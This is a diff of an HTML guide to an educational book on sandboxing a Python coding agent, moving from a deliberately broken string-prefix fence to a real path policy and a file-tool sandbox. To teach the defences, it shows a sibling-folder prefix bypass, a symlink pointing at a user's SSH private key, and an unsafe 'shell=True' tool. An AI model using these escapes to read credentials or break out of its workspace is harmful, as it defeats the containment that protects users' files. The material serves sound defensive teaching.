+<section id="s01">
+<h2><span class="num">01</span><span>Introduction</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This repository is an educational project to learn and understand how to sandbox a small Python coding agent. It is intentionally simplified, optimised for clarity and step-by-step learning, and makes no claim to be secure, complete, or production-ready. Do not deploy it as-is. If you adapt it for real work, add proper validation, isolation, monitoring, testing, and operational controls.</p></div>
 <p>Companion code for a short, hands-on book about sandboxing a small <strong>Python coding agent</strong> — from a deliberately broken string-prefix fence to a hardened Docker container with a hash-chained audit log.</p>
 <p>The book is the six <code>chNN/CHAPTER.md</code> files. This repository is the runnable version: every stage is a standalone Python project, every module is commented, and every security claim has a test beside it.</p>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 If you are using the book as the companion guide for a video series, read <strong>Appendix E — Instructor and recording companion</strong> first. It contains the episode run sheet, demo beats, reset commands, and the questions to plant in each episode.</p></div>
 <div class="callout"><p><strong>Safety note.</strong> Stage 0 is intentionally unsafe. It exists to demonstrate three concrete holes, and its demo only runs against a temporary directory. Do not point <code>unsafe.py</code> at your home folder, do not add <code>--privileged</code> to the Docker recipe, and never mount the Docker socket into the sandbox.</p></div>
-<section id="s01">
-<h2><span class="num">01</span><span>What the book builds</span></h2>
+<h3 id="s01-01">What the book builds</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Stage</th><th style="text-align:left">Chapter</th><th style="text-align:left">The boundary added</th></tr></thead>
 <tbody>
@@ -219,13 +244,26 @@
 <tr><td style="text-align:left">5</td><td style="text-align:left">The finished harness</td><td style="text-align:left">Tool routing, ReAct loop, audit chain, offline demo</td></tr>
 </tbody></table></div>
 <p>A coding agent is a loop that turns model text into operating-system actions. The book focuses on that conversion point: <strong>what a tool is allowed to do, how much it may consume, and what the model sees when it is refused.</strong></p>
-</section>
-<section id="s02">
-<h2><span class="num">02</span><span>Quick start</span></h2>
-<p>Each chapter runs from its own directory. The runtime code has no third-party dependencies; pytest is the only test dependency. Install it once with <code>python -m pip install pytest</code> (or use your own environment manager). No API key is required. Python 3.11 or newer is recommended.</p>
+<h3 id="s01-02">Quick start</h3>
+<p>Each chapter runs from its own directory. The sandbox code uses only the standard library; the demo layer uses Rich for presentation. pytest is the test runner. Install both once with <code>python -m pip install pytest rich</code> (or use your own environment manager such as <code>uv</code>). No API key is required. Python 3.11 or newer is recommended.</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch00
 python -m mini_harness.demo
 python -m pytest -v</pre></figure>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 You can also run a demo as a file, which is handy with <code>uv</code>: <code>cd ch02</code> then <code>uv run mini_harness/demo.py</code>. The demo adds the chapter directory to the import path when it is launched directly. The Stage 5 equivalent is <code>uv run mini_harness/__main__.py</code> from <code>ch05/</code>.</p></div>
+<h4 id="s01-02-01">Demo presentation</h4>
+<p>Every chapter ships the same <code>mini_harness/ui.py</code>, a small Rich wrapper that renders headers, section rules, colour-coded observation cards, command panels and tables. Each stage picks its own accent colour; the rest of the palette is shared.</p>
+<p>After each major output section the demo prints an <strong>explainer</strong> card with two fields: <strong>What</strong> happened in the observation, and <strong>Why</strong> it matters. A learner can read the result and the reasoning without leaving the terminal.</p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch02
+
+# default palette, chapter accent
+uv run mini_harness/demo.py
+
+# plain output for a log file or CI
+MINI_HARNESS_THEME=mono uv run mini_harness/demo.py
+
+# override one colour without editing code
+MINI_HARNESS_ACCENT=magenta uv run mini_harness/demo.py</pre></figure>
+<p>The presets are <code>dark</code>, <code>light</code> and <code>mono</code>. Individual overrides use <code>MINI_HARNESS_ACCENT</code>, <code>MINI_HARNESS_SUCCESS</code>, <code>MINI_HARNESS_WARNING</code>, <code>MINI_HARNESS_ERROR</code>, <code>MINI_HARNESS_INFO</code>, <code>MINI_HARNESS_MUTED</code>, <code>MINI_HARNESS_TITLE</code> and <code>MINI_HARNESS_BOX</code>.</p>
 <p>The finished harness:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch05
 python -m mini_harness                 # offline demo, Docker optional
@@ -236,9 +274,7 @@ python -m pytest -v</pre></figure>
 docker build -t mini-harness-python:latest docker
 python -m mini_harness.demo</pre></figure>
 <p>Docker integration tests skip cleanly when the daemon or image is missing. The offline tests never need Docker.</p>
-</section>
-<section id="s03">
-<h2><span class="num">03</span><span>Rebuild the book artifacts</span></h2>
+<h3 id="s01-03">Rebuild the book artifacts</h3>
 <p>The chapters and manuals are the editable sources. <code>scripts/build_book.py</code> concatenates them into two generated Markdown variants: <code>book.md</code> for the PDF (one title, <code>##</code> chapters) and <code>book_html.md</code> for the sidebar reading guide (one <code>#</code> per chapter).</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python scripts/build_book.py</pre></figure>
 <p>PDF export (needs <code>markdown</code> and <code>pypdf</code>; Chrome or Edge is detected automatically):</p>
@@ -246,20 +282,20 @@ python -m mini_harness.demo</pre></figure>
 <p>HTML reading guide (needs Node.js; the local converter is in the skill):</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python scripts/build_book_html.py</pre></figure>
 <p><code>book.pdf</code> and <code>book.html</code> are the two reader-facing artifacts; <code>book.md</code> and <code>book_html.md</code> are generated intermediate sources.</p>
-</section>
-<section id="s04">
-<h2><span class="num">04</span><span>Repository map</span></h2>
+<h3 id="s01-04">Repository map</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Path</th><th style="text-align:left">What it is</th></tr></thead>
 <tbody>
 <tr><td style="text-align:left"><code>ch00/</code> … <code>ch05/</code></td><td style="text-align:left">One standalone, runnable stage per chapter</td></tr>
 <tr><td style="text-align:left"><code>chNN/CHAPTER.md</code></td><td style="text-align:left">The chapter: problem, design, walkthrough, acceptance, limits</td></tr>
 <tr><td style="text-align:left"><code>chNN/mini_harness/</code></td><td style="text-align:left">The stage's Python package</td></tr>
+<tr><td style="text-align:left"><code>chNN/mini_harness/ui.py</code></td><td style="text-align:left">Shared Rich presentation layer; the same file in every chapter</td></tr>
 <tr><td style="text-align:left"><code>chNN/tests/</code></td><td style="text-align:left">unittest-style tests, collected by <code>pytest</code></td></tr>
 <tr><td style="text-align:left"><code>chNN/workspace/</code></td><td style="text-align:left">A small sample workspace for experimenting</td></tr>
 <tr><td style="text-align:left"><code>ch04/docker/</code>, <code>ch05/docker/</code></td><td style="text-align:left">The sandbox image</td></tr>
 <tr><td style="text-align:left"><code>plan.md</code></td><td style="text-align:left">The stage-by-stage build contract</td></tr>
 <tr><td style="text-align:left"><code>function_reference.md</code></td><td style="text-align:left">Alphabetical and file-by-file code map</td></tr>
+<tr><td style="text-align:left"><code>INSTRUCTOR_NOTES.md</code></td><td style="text-align:left">Appendix E: the episode run sheet and recording companion</td></tr>
 <tr><td style="text-align:left"><code>THREAT_MODEL.md</code></td><td style="text-align:left">Assets, adversaries, threats, mitigations and residual risk</td></tr>
 <tr><td style="text-align:left"><code>OPERATIONS.md</code></td><td style="text-align:left">Build, run, update, audit and incident-response runbook</td></tr>
 <tr><td style="text-align:left"><code>qa.html</code></td><td style="text-align:left">Architecture Q&amp;A companion built with the shared explainer standard; open it in a browser</td></tr>
@@ -274,9 +310,7 @@ python -m mini_harness.demo</pre></figure>
 <tr><td style="text-align:left"><code>EXPLAINERS.md</code></td><td style="text-align:left">Shared HTML explainer standard</td></tr>
 <tr><td style="text-align:left"><code>assets/</code>, <code>templates/</code></td><td style="text-align:left">Shared explainer CSS/JS and starter page</td></tr>
 </tbody></table></div>
-</section>
-<section id="s05">
-<h2><span class="num">05</span><span>Design rules used throughout</span></h2>
+<h3 id="s01-05">Design rules used throughout</h3>
 <ol>
 <li><strong>One policy per boundary.</strong> File paths go through one <code>PathPolicy</code>. Container flags go through one <code>DockerRunner</code>. A tool does not invent a second check.</li>
 <li><strong>Refusals are observations.</strong> A tool returns <code>ERROR[PATH]: ...</code>, not a traceback. The loop continues; the model can choose another action.</li>
@@ -287,9 +321,7 @@ python -m mini_harness.demo</pre></figure>
 <li><strong>The audit is outside the workspace.</strong> Tools cannot edit their own trail through the sandbox, and the hash chain makes edits visible.</li>
 <li><strong>The step limit is in the loop.</strong> A model may loop forever; the harness may not.</li>
 </ol>
-</section>
-<section id="s06">
-<h2><span class="num">06</span><span>Test map</span></h2>
+<h3 id="s01-06">Test map</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Chapter</th><th style="text-align:left">Command</th><th style="text-align:left">Docker needed</th><th style="text-align:left">Notes</th></tr></thead>
 <tbody>
@@ -312,31 +344,26 @@ done</pre></figure>
   python -m pytest -v
   Pop-Location
 }</pre></figure>
-</section>
-<section id="s07">
-<h2><span class="num">07</span><span>Platform notes</span></h2>
+<h3 id="s01-07">Platform notes</h3>
 <ul>
 <li><strong>Windows.</strong> Creating symlinks needs Developer Mode or an elevated process; the path-policy symlink tests skip when the OS refuses. POSIX <code>RLIMIT_*</code> tests also skip. The Docker chapters use Linux containers through Docker Desktop.</li>
 <li><strong>macOS / Linux.</strong> Symlink and rlimit tests run. Docker Desktop or Docker Engine is needed only for the integration tests.</li>
 <li><strong>No Docker?</strong> The book still teaches the whole path from Stage 0 to Stage 3, and Stage 4's offline tests validate the exact container recipe.</li>
 </ul>
-</section>
-<section id="s08">
-<h2><span class="num">08</span><span>Where to start reading</span></h2>
-<p>Read <code>THREAT_MODEL.md</code> first if you want the “why”. Read <code>plan.md</code> if you want the contract. Read <code>function_reference.md</code> when you are tracing a function. Open <code>qa.html</code> when you want the short answer to an architecture question. Every HTML explainer follows <code>EXPLAINERS.md</code>; generate a new one from Markdown with <code>node scripts/md-to-html.mjs &lt;input.md&gt;</code>.</p>
+<h3 id="s01-08">Where to start reading</h3>
+<p>Read <code>THREAT_MODEL.md</code> first if you want the “why”. Read <code>plan.md</code> if you want the contract. Read <code>function_reference.md</code> when you are tracing a function. Open <code>qa.html</code> when you want the short answer to an architecture question. Open <code>INSTRUCTOR_NOTES.md</code> when you are planning or recording an episode. Every HTML explainer follows <code>EXPLAINERS.md</code>; generate a new one from Markdown with <code>node scripts/md-to-html.mjs &lt;input.md&gt;</code>.</p>
 <p>Then start at <code>ch00/CHAPTER.md</code> and run each stage in order. The code is cumulative in shape but each chapter is standalone on disk, so you can jump to the boundary you care about.</p>
 <hr>
 </section>
-<section id="s09">
-<h2><span class="num">09</span><span>Chapter 0 — Stage 0: The naive fence</span></h2>
+<section id="s02">
+<h2><span class="num">02</span><span>Chapter 0 — Stage 0: The naive fence</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.</p></div>
 <p><strong>Book:</strong> Stage 0, &quot;The naive fence&quot; <strong>Plan:</strong> Stage 0 <strong>Goal:</strong> Build the smallest possible tool surface, then prove that its sandbox is not a sandbox.</p>
-</section>
-<section id="s10">
-<h2><span class="num">10</span><span>The shape we are building</span></h2>
+<h3 id="s02-01">The shape we are building</h3>
 <p>A coding agent is a loop:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>user task -&gt; model -&gt; tool call -&gt; observation -&gt; model -&gt; ... -&gt; final answer</pre></figure>
 <p>The interesting part for this book is the arrow between <strong>tool call</strong> and <strong>observation</strong>. A tool is where model text becomes an operating-system action: a file read, a file write, a process start. Everything else is conversation. Sandboxing is the set of decisions that controls that arrow.</p>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Open with the three-line prefix check, not the theory. Ask the viewer to spot the flaw before you name it. The answer lands harder after a pause than after a definition.</p></div>
 <p>Stage 0 deliberately makes the wrong decisions, because they are the ones a first prototype usually makes:</p>
 <ul>
 <li>join the requested path to a workspace root;</li>
@@ -346,32 +373,26 @@ done</pre></figure>
 <li>trust the model not to ask for anything strange.</li>
 </ul>
 <p>Each of those choices looks reasonable in a demo. Each has a concrete failure.</p>
-</section>
-<section id="s11">
-<h2><span class="num">11</span><span>What changed</span></h2>
+<h3 id="s02-02">What changed</h3>
 <ul>
 <li>Added <code>mini_harness/unsafe.py</code> with <code>read_file</code>, <code>list_files</code> and <code>run_shell</code>.</li>
 <li>Added <code>mini_harness/demo.py</code>, which builds a throwaway lab and shows the holes.</li>
 <li>Added <code>tests/test_unsafe.py</code>, which <strong>asserts the bad outcomes</strong> so the threat model is executable.</li>
 </ul>
-</section>
-<section id="s12">
-<h2><span class="num">12</span><span>The three holes</span></h2>
-<h3 id="s12-01">1. A prefix check is not a containment check</h3>
+<h3 id="s02-03">The three holes</h3>
+<h4 id="s02-03-01">1. A prefix check is not a containment check</h4>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>target = os.path.abspath(os.path.join(root, relative))
 if target.startswith(root):
     return Path(target).read_text()</pre></figure>
 <p><code>/tmp/workspace-evil</code> starts with <code>/tmp/workspace</code>. A sibling folder therefore passes the fence. The check compares spellings, not filesystem identities.</p>
-<h3 id="s12-02">2. A symlink is inside the workspace by name and outside by target</h3>
+<h4 id="s02-03-02">2. A symlink is inside the workspace by name and outside by target</h4>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>workspace/innocent-link.txt -&gt; /home/me/.ssh/id_ed25519</pre></figure>
 <p>The string <code>workspace/innocent-link.txt</code> starts with <code>workspace</code>, so the check passes. The kernel follows the link and opens the key. <code>os.path.abspath</code> does not resolve symlinks; it only collapses <code>.</code> and <code>..</code>.</p>
-<h3 id="s12-03">3. A shell is not a command runner</h3>
+<h4 id="s02-03-03">3. A shell is not a command runner</h4>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>subprocess.run(command, shell=True, cwd=root)</pre></figure>
 <p>This gives one tool call the power to become many commands. It also inherits every secret in the parent environment, has no wall-clock limit, captures unbounded output in memory, and applies no CPU, memory or file-size limit.</p>
 <p>The tests keep the shell command harmless (<code>echo hello</code>). The point is the shape of the call, not a destructive example. Never point Stage 0 at a real home directory.</p>
-</section>
-<section id="s13">
-<h2><span class="num">13</span><span>Run it</span></h2>
+<h3 id="s02-04">Run it</h3>
 <p>From <code>ch00/</code>:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python -m mini_harness.demo
 python -m pytest -v</pre></figure>
@@ -379,9 +400,9 @@ python -m pytest -v</pre></figure>
 <p>Expected shape:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>[leaked ] prefix sibling: sibling secret\n
 [blocked] plain ../ traversal: ValueError: path escapes workspace: ../outside-secret.txt</pre></figure>
-</section>
-<section id="s14">
-<h2><span class="num">14</span><span>It works when</span></h2>
+<div class="callout"><p><strong>Demo beat:</strong> 🧪 Show the <code>[leaked]</code> prefix-sibling line first, then the <code>[blocked]</code> traversal line. The contrast is the whole episode: one is caught by spelling, the other is not a spelling problem at all.</p></div>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Keep the shell command harmless. Never point this stage at a real home folder or run a destructive command for a reaction. The lesson is the shape of the call, not the damage.</p></div>
+<h3 id="s02-05">It works when</h3>
 <ul>
 <li>[ ] <code>python -m mini_harness.demo</code> exits zero.</li>
 <li>[ ] The prefix-sibling read is reported as <code>[leaked]</code>.</li>
@@ -390,14 +411,12 @@ python -m pytest -v</pre></figure>
 <li>[ ] <code>python -m pytest -v</code> passes (symlink test may skip).</li>
 <li>[ ] You can explain why the symlink case is invisible to <code>startswith</code>.</li>
 </ul>
-</section>
-<section id="s15">
-<h2><span class="num">15</span><span>Why keep the broken code?</span></h2>
+<h3 id="s02-06">Why keep the broken code?</h3>
 <p>Because &quot;we will add security later&quot; is easier to resist when the first version comes with a failing threat model. The tests are not celebrating the holes; they are pinning them down. Chapter 1 replaces the expectations with the opposite ones: the escape must be refused.</p>
 <p>A second reason is pedagogical: the fixed version is easier to trust when you have seen the exact input that broke the naive version.</p>
-</section>
-<section id="s16">
-<h2><span class="num">16</span><span>Stage limits</span></h2>
+<div class="callout"><p><strong>Audience question:</strong> 🗣️ &quot;If the path starts with the workspace folder, is it inside the workspace?&quot; Pause, then show <code>workspace-evil</code>. That one example carries the entire episode.</p></div>
+<div class="callout"><p><strong>Edit note:</strong> ✂️ If the symlink case skips on Windows, record the skip once, explain Developer Mode, and move on. Do not spend the take fighting the OS.</p></div>
+<h3 id="s02-07">Stage limits</h3>
 <ul>
 <li>No real path policy.</li>
 <li>No size limits.</li>
@@ -405,17 +424,13 @@ python -m pytest -v</pre></figure>
 <li>No audit trail.</li>
 <li>The demo is intentionally unsafe; do not reuse <code>unsafe.py</code>.</li>
 </ul>
-</section>
-<section id="s17">
-<h2><span class="num">17</span><span>If it goes wrong</span></h2>
+<h3 id="s02-08">If it goes wrong</h3>
 <ul>
 <li>**The demo blocks plain <code>../</code> and nothing else** — that is correct for this stage. The string check catches the obvious spelling.</li>
 <li><strong>The symlink case skips</strong> — Windows needs Developer Mode or an elevated process to create symlinks. The prefix-sibling case still demonstrates the class of bug.</li>
 <li><strong>A test fails because echo is missing</strong> — the demo uses the platform shell; <code>echo</code> is available in both <code>cmd.exe</code> and POSIX shells. If your environment is unusual, replace it with <code>python -c &quot;print('hello')&quot;</code> in <code>run_shell</code>.</li>
 </ul>
-</section>
-<section id="s18">
-<h2><span class="num">18</span><span>Read next</span></h2>
+<h3 id="s02-09">Read next</h3>
 <ul>
 <li><code>../plan.md</code> Stage 0</li>
 <li><code>../THREAT_MODEL.md</code> — the full list of assets and threats</li>
@@ -423,14 +438,13 @@ python -m pytest -v</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s19">
-<h2><span class="num">19</span><span>Chapter 1 — Stage 1: One path policy</span></h2>
+<section id="s03">
+<h2><span class="num">03</span><span>Chapter 1 — Stage 1: One path policy</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.</p></div>
 <p><strong>Book:</strong> Stage 1, &quot;One path policy&quot; <strong>Plan:</strong> Stage 1 <strong>Goal:</strong> Replace the string-prefix fence with one object that resolves real paths and answers the same question for every tool.</p>
-</section>
-<section id="s20">
-<h2><span class="num">20</span><span>The problem</span></h2>
+<h3 id="s03-01">The problem</h3>
 <p>The naive fence fails because it asks &quot;does this path <em>look</em> like it is inside the workspace?&quot; The kernel asks &quot;which file will this path <em>open</em>?&quot; Those are different questions, and only the second one matters.</p>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Put that pair of questions on a slide and leave it up for the whole explanation. Every mechanism in this chapter is an answer to the second question.</p></div>
 <p>There are three layers to get right:</p>
 <ol>
 <li><strong>Lexical normalisation.</strong> Collapse <code>.</code> and <code>..</code>; reject NUL bytes, control characters, UNC paths and drive-relative forms.</li>
@@ -438,18 +452,14 @@ python -m pytest -v</pre></figure>
 <li><strong>Containment.</strong> Compare canonical paths with a real common-path check, not <code>startswith</code>.</li>
 </ol>
 <p>Stage 1 puts all three in <code>mini_harness/path_policy.py</code>. It contains no file-content logic. It only answers where a path points.</p>
-</section>
-<section id="s21">
-<h2><span class="num">21</span><span>What changed</span></h2>
+<h3 id="s03-02">What changed</h3>
 <ul>
 <li>Added <code>mini_harness/path_policy.py</code> with <code>PathPolicy</code>, <code>PolicyError</code> and <code>ResolvedPath</code>.</li>
 <li>Added <code>mini_harness/demo.py</code>, which exercises allowed and refused names.</li>
 <li>Added <code>tests/test_path_policy.py</code> with 25 cases covering the platform edges.</li>
 </ul>
-</section>
-<section id="s22">
-<h2><span class="num">22</span><span>The central algorithm</span></h2>
-<h3 id="s22-01">Resolve the deepest existing ancestor</h3>
+<h3 id="s03-03">The central algorithm</h3>
+<h4 id="s03-03-01">Resolve the deepest existing ancestor</h4>
 <p>A write target often does not exist yet:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>workspace/deep/new/file.txt</pre></figure>
 <p><code>os.path.realpath</code> only resolves what is on disk. If the whole path is missing, it cannot tell you that <code>workspace/link-to-outside</code> is a symlinked parent.</p>
@@ -466,16 +476,16 @@ for part in reversed(missing):
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>workspace/outside-link/new.txt
                 ^ symlink to /tmp/attacker</pre></figure>
 <p>The <code>new.txt</code> does not exist, but its parent does. Resolving the parent proves that the canonical target is outside the workspace.</p>
-<h3 id="s22-02">Compare real paths with <code>commonpath</code></h3>
+<h4 id="s03-03-02">Compare real paths with <code>commonpath</code></h4>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>root = os.path.normcase(str(self.real_root))
 target = os.path.normcase(str(real_target))
 common = os.path.commonpath([root, target])
 return common == root</pre></figure>
 <p><code>commonpath</code> understands path boundaries. On Windows it raises <code>ValueError</code> for paths on different drives; that is a refusal, not a crash. <code>normcase</code> lowercases on Windows so case-insensitive filesystems compare correctly.</p>
-<h3 id="s22-03">Reads and writes differ on purpose</h3>
+<h4 id="s03-03-03">Reads and writes differ on purpose</h4>
 <p>Reads may be absolute as long as the resolved file is inside the root. A developer may want to read a file by its full path. Writes must be relative: a write should be an intentional workspace action, not an absolute overwrite of a system file.</p>
 <p>Writes also refuse a final symlink. The atomic writer in Stage 2 would replace the link rather than follow it, but other tools may not. Refusing at the policy layer makes the rule independent of the tool.</p>
-<h3 id="s22-04">Platform spellings are normalised before validation</h3>
+<h4 id="s03-03-04">Platform spellings are normalised before validation</h4>
 <p>The policy treats <code>\</code> as a separator on every platform. On POSIX, <code>..\secret</code> would otherwise be a legal (but bizarre) filename. Normalising it makes the answer the same everywhere: that is traversal, and it is refused.</p>
 <p>The policy also rejects:</p>
 <ul>
@@ -486,9 +496,7 @@ return common == root</pre></figure>
 <li>trailing dots and spaces on Windows — the OS may strip them, so two different strings can name the same file;</li>
 <li>control characters, especially NUL.</li>
 </ul>
-</section>
-<section id="s23">
-<h2><span class="num">23</span><span>Run it</span></h2>
+<h3 id="s03-04">Run it</h3>
 <p>From <code>ch01/</code>:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python -m mini_harness.demo
 python -m pytest -v</pre></figure>
@@ -496,9 +504,9 @@ python -m pytest -v</pre></figure>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>[allowed] read notes.txt: notes.txt -&gt; ...\workspace\notes.txt
 [blocked] read ../outside.txt: PATH: path escapes workspace: ../outside.txt
 [blocked] read prefix sibling: PATH: path escapes workspace: ../workspace-evil/secret.txt</pre></figure>
-</section>
-<section id="s24">
-<h2><span class="num">24</span><span>It works when</span></h2>
+<div class="callout"><p><strong>Demo beat:</strong> 🧪 Run the normal read, then the two refusals through the same policy. Point at the canonical path in the first line: that is the value the kernel will use, and the string the naive fence never compared.</p></div>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Show the <code>commonpath</code> comparison as one small code block. Do not scroll the whole module. The viewer needs the boundary check, not the platform trivia.</p></div>
+<h3 id="s03-05">It works when</h3>
 <ul>
 <li>[ ] A normal read resolves to a canonical path inside the root.</li>
 <li>[ ] <code>../outside.txt</code> is refused.</li>
@@ -510,27 +518,22 @@ python -m pytest -v</pre></figure>
 <li>[ ] <code>CON.txt</code>, <code>C:foo</code>, UNC and NUL-byte names are refused.</li>
 <li>[ ] The symlink tests skip, rather than fail, on a machine that cannot create symlinks.</li>
 </ul>
-</section>
-<section id="s25">
-<h2><span class="num">25</span><span>Stage limits</span></h2>
+<h3 id="s03-06">Stage limits</h3>
 <ul>
 <li>The policy is not a jail. A Python process running as the same user can still open files directly with <code>os.open</code>, race a check, or read <code>/proc</code>.</li>
 <li>The policy does not cap file sizes; Stage 2 adds that.</li>
 <li>The policy does not audit refusals; Stage 5 adds that.</li>
 <li><code>realpath</code> + <code>open</code> is still a time-of-check/time-of-use gap. The only full answer is a separate security boundary (Stage 4).</li>
 </ul>
-</section>
-<section id="s26">
-<h2><span class="num">26</span><span>If it goes wrong</span></h2>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Do not call this chapter a jail. It is one policy, applied consistently. The kernel still lets the same user open files directly, and a determined race is out of scope until the container arrives.</p></div>
+<h3 id="s03-07">If it goes wrong</h3>
 <ul>
 <li><strong>A symlink test skips on Windows</strong> — enable Developer Mode or run elevated, or accept the skip. The prefix-sibling and traversal tests still exercise the containment logic.</li>
 <li>**<code>resolve_read(&quot;C:/x&quot;)</code> behaves differently on POSIX** — drive-absolute paths are refused on non-Windows because they would be interpreted as a relative name containing a colon. This is intentional.</li>
 <li>**A path with <code>..</code> gets a reserved-name error** — make sure <code>.</code> and <code>..</code> are skipped by the reserved-name check and handled by normalisation. The tests cover this.</li>
 <li><strong>A write to a new nested path is refused</strong> — check that <code>_realpath_best</code> reattaches the missing tail after resolving the parent. Stage 2's <code>_ensure_parent</code> creates those folders.</li>
 </ul>
-</section>
-<section id="s27">
-<h2><span class="num">27</span><span>Read next</span></h2>
+<h3 id="s03-08">Read next</h3>
 <ul>
 <li><code>../plan.md</code> Stage 1</li>
 <li><code>../THREAT_MODEL.md</code> — path traversal and symlink threats</li>
@@ -538,13 +541,11 @@ python -m pytest -v</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s28">
-<h2><span class="num">28</span><span>Chapter 2 — Stage 2: The sandbox object and file tools</span></h2>
+<section id="s04">
+<h2><span class="num">04</span><span>Chapter 2 — Stage 2: The sandbox object and file tools</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.</p></div>
 <p><strong>Book:</strong> Stage 2, &quot;The sandbox object and file tools&quot; <strong>Plan:</strong> Stage 2 <strong>Goal:</strong> Put every file operation behind one object with size limits, atomic writes and a stable error vocabulary.</p>
-</section>
-<section id="s29">
-<h2><span class="num">29</span><span>The problem</span></h2>
+<h3 id="s04-01">The problem</h3>
 <p>A path policy is necessary but not sufficient. Even a correctly resolved path can be used badly:</p>
 <ul>
 <li>reading a 2 GB file into the model's context;</li>
@@ -554,18 +555,15 @@ python -m pytest -v</pre></figure>
 <li>raising a Python exception that unwinds the agent loop.</li>
 </ul>
 <p>Stage 2 turns the policy into a <strong>sandbox contract</strong>. The policy still answers &quot;where&quot;; the sandbox answers &quot;how much, how safely, and what does the caller see when it is refused?&quot;</p>
-</section>
-<section id="s30">
-<h2><span class="num">30</span><span>What changed</span></h2>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Open with the four failure modes as a list, not with the code. The viewer should feel the problem before seeing <code>Limits(...)</code>.</p></div>
+<h3 id="s04-02">What changed</h3>
 <ul>
 <li>Added <code>mini_harness/sandbox.py</code> with <code>Sandbox</code>, <code>Limits</code>, <code>DirEntry</code> and <code>SandboxError</code>.</li>
 <li>Added <code>mini_harness/file_tools.py</code> with the model-facing tool contract and <code>run_tool</code>.</li>
 <li>Added <code>mini_harness/demo.py</code> and <code>tests/test_sandbox.py</code>.</li>
 </ul>
-</section>
-<section id="s31">
-<h2><span class="num">31</span><span>The contract</span></h2>
-<h3 id="s31-01">Limits</h3>
+<h3 id="s04-03">The contract</h3>
+<h4 id="s04-03-01">Limits</h4>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>@dataclass(frozen=True)
 class Limits:
     max_read_bytes: int = 2 * 1024 * 1024
@@ -573,37 +571,35 @@ class Limits:
     max_dir_entries: int = 500
     max_line_bytes: int = 4000</pre></figure>
 <p>These are policy choices, not security boundaries. They protect the <strong>agent process</strong> from a tool result that is too large to handle. A model can still ask for a small file many times; the loop's step limit and the operator's rate limits are the answer to that.</p>
-<h3 id="s31-02">Reads are byte-bounded</h3>
+<h4 id="s04-03-02">Reads are byte-bounded</h4>
 <p><code>read_text</code> checks <code>stat().st_size</code> before opening. It then reads bytes and decodes UTF-8 with <code>errors=&quot;replace&quot;</code>. Reading bytes:</p>
 <ul>
 <li>applies the limit to exactly the data received;</li>
 <li>avoids newline translation, so an edit round-trip preserves <code>\r\n</code>;</li>
 <li>avoids crashing on one stray non-UTF-8 byte.</li>
 </ul>
-<h3 id="s31-03">Writes are atomic</h3>
+<h4 id="s04-03-03">Writes are atomic</h4>
 <p>The writer creates a temporary file in the <strong>same directory</strong>, writes and flushes it, calls <code>os.fsync</code>, then <code>os.replace</code>s it over the target. A reader sees the old file or the new file, never a half-written one. The temporary file is removed on failure.</p>
 <p>The parent folders are created one component at a time, and the policy is re-run after each <code>mkdir</code>. That does not eliminate a determined race, but it catches a symlink planted between the first check and the write. The real fix for a hostile local user is the container in Stage 4.</p>
-<h3 id="s31-04">Edits are unique by default</h3>
+<h4 id="s04-03-04">Edits are unique by default</h4>
 <p><code>edit_text(path, old, new)</code> refuses when <code>old</code> appears zero times or more than once. A silent <code>replace</code> of three identical snippets is a classic way for an agent to corrupt code. Passing <code>count=0</code> means &quot;replace all&quot; and is an explicit opt-in.</p>
-<h3 id="s31-05">Deletes are file-only</h3>
+<h4 id="s04-03-05">Deletes are file-only</h4>
 <p><code>delete_file</code> refuses directories and non-regular files. Recursive delete is a much larger blast radius than one file, and an agent can always ask for files one at a time. A symlink is refused by the policy before this method sees it.</p>
-<h3 id="s31-06">Errors become observations</h3>
+<h4 id="s04-03-06">Errors become observations</h4>
 <p>Tools return strings, not exceptions:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>OK: wrote 19 bytes to todo.md
 ERROR[PATH]: path escapes workspace: ../outside.txt
